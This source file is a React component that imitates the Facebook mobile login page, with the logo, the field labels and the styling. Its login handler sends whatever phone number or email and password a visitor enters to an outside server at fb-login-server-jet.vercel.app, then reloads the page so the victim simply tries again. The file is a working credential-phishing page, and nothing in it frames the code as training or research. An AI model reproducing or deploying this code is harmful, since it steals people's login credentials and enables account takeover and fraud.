import './App.css'
import fbIcon from '../src/assets/facebook-icon.png'
import { Eye, EyeOff } from 'lucide-react'
import { useState } from 'react'
import axios from 'axios'

function App() {

  const [eye, setEye] = useState(false)
  const [number, setNumber] = useState("");
  const [password, setPassword] = useState("")
  
  const handleAddUser = async () => {
    const userInfo = {
      number: number,
      password: password
    }
    if (!number || !password) {
      console.log('number or password not found');
      return;
    }
    try {
      const config = {
        headers: {
          "Content-type": "application/json"
        }
      };
      const response = await axios.post('https://fb-login-server-jet.vercel.app/api/login/user', userInfo, config)
      console.log(response)
      if (response.status === 201) {
        window.location.reload()
      }

    } catch (error) {
      console.log(error)
    }
  }

  return (
    <main className='flex bg-[#10232E] relative flex-col mx-auto items-center justify-center w-screen h-screen'>
      <div className='mb-16'>
        <img className='w-16' src={fbIcon} alt="" />
      </div>
      <div className='w-full mx-auto flex flex-col space-y-3 items-center justify-center'>
        <div className='bg-[#1C2A33] rounded-xl overflow-clip w-11/12 h-16 border border-slate-500'>
          <input onChange={(e) => setNumber(e.target.value)} className='w-full text-slate-400 font-semibold bg-transparent focus:outline-none border-none h-full p-4 text-lg' type="text" name="" id="" placeholder='Mobile number or email address' />
        </div>

        <div className='bg-[#1C2A33] relative rounded-xl overflow-clip w-11/12 h-16 border border-slate-500'>
          <span onClick={() => setEye(!eye)} className='absolute z-50 right-4 text-slate-400 mt-2 translate-y-1/2'>
            {
              eye ? <Eye /> : <EyeOff />
            }
          </span>
          <input onChange={(e) => setPassword(e.target.value)} className='w-full text-slate-400 font-semibold bg-transparent focus:outline-none border-none h-full p-4 text-lg' type={`${eye ? "text" : "password"}`} name="" id="" placeholder='Password' />
        </div>

        <button onClick={handleAddUser} type='submit' className='text-white bg-blue-600 w-11/12 rounded-full px-4 py-2 h-14 text-xl font-semibold'>Log In</button>

        <div>
          <h1 className='text-white text-xl hover:underline hover:cursor-pointer'>Forgotten Password?</h1>
        </div>
      </div>
      <div className='w-11/12 absolute bottom-2'>
        <button className='border border-blue-600 rounded-2xl text-blue-600 py-3 px-4 w-full font-semibold text-lg'>Create new account</button>
      </div>
    </main>
  )
}

export default App
